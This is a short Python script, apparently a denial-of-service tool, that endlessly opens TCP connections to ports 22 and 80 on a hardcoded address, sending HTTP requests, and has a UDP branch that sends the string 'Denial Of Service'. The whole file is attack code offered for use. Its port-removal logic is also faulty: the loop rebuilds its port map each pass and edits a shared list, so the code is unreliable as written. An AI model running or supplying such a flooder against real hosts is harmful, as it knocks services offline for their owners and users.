import socket
import random
import time
import sys

targets = '[192.168.3.135]'
ports = [22, 80]
buffer_size = 1024
transmission = "TCP"
attack_message = "Denial Of Service"

# convert target string to array
targets = targets.replace("[", "")
targets = targets.replace("]", "")
targets = targets.split(",")

while True:
    analyze = {}
    for target in targets:
        analyze[target] = ports

    if transmission == "TCP":
        target = random.choice(targets)
        port = random.choice(analyze[target])
        start_time = time.time()
        try:
            if port == 80:
                conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                conn.connect((target, port))
                conn.sendall(b"GET / HTTP/1.0\r\n\r\n")
                data = conn.recv(buffer_size)
                data = data.decode()
                conn.close()
            else:
                conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                conn.connect((target, port))
                data = conn.recv(buffer_size)
                data = data.decode()
                conn.close()

        except Exception as error:
            data = str(error)

        end_time = time.time() - start_time
        if end_time > float(2) or 'refused it' in data:
            sys.stdout.write("Removing port: {}. For target: {}.\n".format(str(port), target))
            sys.stdout.write("Target took too long to respond or connection refused.\n")
            sys.stdout.flush()

            analyze[target].remove(port)

    elif transmission == "UDP":
        target = random.choice(targets)
        port = random.choice(ports)
        try:
            conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            conn.connect((target, port))

            conn.sendto(attack_message.encode(), (target, port))
            conn.close()
        except Exception as error:
            pass

